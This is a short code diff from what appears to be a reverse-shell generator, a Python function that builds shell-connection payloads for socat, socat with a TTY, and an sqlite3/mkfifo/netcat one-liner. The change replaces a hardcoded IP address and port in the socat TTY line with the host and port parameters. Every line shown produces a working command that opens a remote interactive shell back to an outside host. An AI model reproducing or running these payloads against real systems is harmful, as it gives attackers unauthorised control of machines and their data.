@@ -60,7 +60,7 @@ def create_shell(lang, shell, host, port):
     elif lang == "socat":
         payload = f"socat TCP:{host}:{port} EXEC:{shell}"
     elif lang == "socat TTY":
-        payload = f"socat TCP:95.181.173.188:31337 EXEC:'sh',pty,stderr,setsid,sigint,sane"
+        payload = f"socat TCP:{host}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane"
     elif lang == "sqlite3 nc mkfifo":
         payload = f"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {host} {port} >/tmp/f'"
     elif lang == "node.js":
